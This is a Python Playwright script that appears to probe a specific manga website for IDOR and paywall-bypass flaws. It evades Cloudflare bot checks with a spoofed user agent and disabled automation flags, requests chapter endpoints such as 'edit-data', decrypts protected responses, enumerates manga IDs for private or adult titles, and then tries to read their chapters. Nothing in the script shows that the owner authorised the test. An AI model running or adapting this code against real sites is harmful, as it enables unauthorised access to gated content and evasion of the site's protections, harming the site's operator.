#!/usr/bin/env python3
"""Focused content/paywall IDOR test using real chapter IDs (high numbers)."""
import asyncio, json, sys, time
from playwright.async_api import async_playwright
sys.path.insert(0, "/home/ubuntu/kuromangas.com/webapp")
from webapp_attack import (clear_cf, api_fetch, decrypt_cap, save_cap,
                           load_session, BASE, CAPS)

async def main():
    async with async_playwright() as p:
        b = await p.chromium.launch(headless=True, args=["--no-sandbox","--disable-blink-features=AutomationControlled"])
        ctx = await b.new_context(user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36", viewport={"width":1366,"height":900}, locale="pt-BR")
        pg = await ctx.new_page()
        ok, body = await clear_cf(pg, ctx)
        if not ok: print("CF fail"); return
        sess = await load_session(ctx)
        nonce = sess.get("_kn")
        hdrs = {"X-Session-Nonce": nonce} if nonce else {}

        # find a few real chapter IDs from manga 1 chapters list (already known)
        real_chapter_ids = [216128, 211475, 207583, 201521, 439170]
        for cid in real_chapter_ids:
            for ep in [f"chapters/{cid}", f"chapters/{cid}/details", f"chapters/{cid}/reactions",
                       f"chapters/{cid}/edit-data", f"chapters/{cid}/report-status"]:
                r = await api_fetch(pg, "GET", ep, extra_headers=hdrs)
                save_cap("content_%s.json" % ep.replace("/","_"), r)
                plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
                preview=(plain or r.get("body") or "")[:160].replace("\n"," ")
                print("  %s -> %s  %s" % (ep, r["status"], preview))
                await pg.wait_for_timeout(500)
            # test page access (the actual content) — chapters/<id>/page?path=... or via /api/chapters/<id>/page
            print("---")

        # Now hunt for a private or adult manga to test paywall/gating bypass
        print("== hunting private/adult mangas among IDs 1..60 ==")
        priv=[]
        for mid in range(1,61):
            r = await api_fetch(pg, "GET", f"mangas/{mid}", extra_headers=hdrs)
            plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
            try:
                obj=json.loads(plain) if plain else {}
                mg=obj.get("manga",{})
                if mg.get("is_private") or mg.get("is_adult"):
                    priv.append((mid, mg.get("is_private"), mg.get("is_adult"), mg.get("title"), (mg.get("chapters") or [{}])[0].get("id") if mg.get("chapters") else None))
                    print("  FOUND private/adent manga id=%s private=%s adult=%s title=%r ch0=%s" % (mid, mg.get("is_private"), mg.get("is_adult"), mg.get("title"), (mg.get("chapters") or [{}])[0].get("id")))
            except Exception:
                pass
            await pg.wait_for_timeout(200)
        print("private/adult found:", priv)

        # For each private/adult found, try to read a chapter (content bypass)
        for mid,privf,adult,title,cid in priv:
            if not cid: continue
            print("== testing chapter access to private/adult manga %s ch=%s ==" % (mid,cid))
            for ep in [f"chapters/{cid}", f"chapters/{cid}/details"]:
                r = await api_fetch(pg, "GET", ep, extra_headers=hdrs)
                save_cap("content_priv_%s.json" % ep.replace("/","_"), r)
                plain,_ = decrypt_cap(r) if "_v_secure" in (r.get("body") or "") else (r.get("body"),None)
                print("  %s -> %s %s" % (ep, r["status"], (plain or r.get("body") or "")[:200].replace("\n"," ")))
                await pg.wait_for_timeout(500)

        await b.close()

asyncio.run(main())
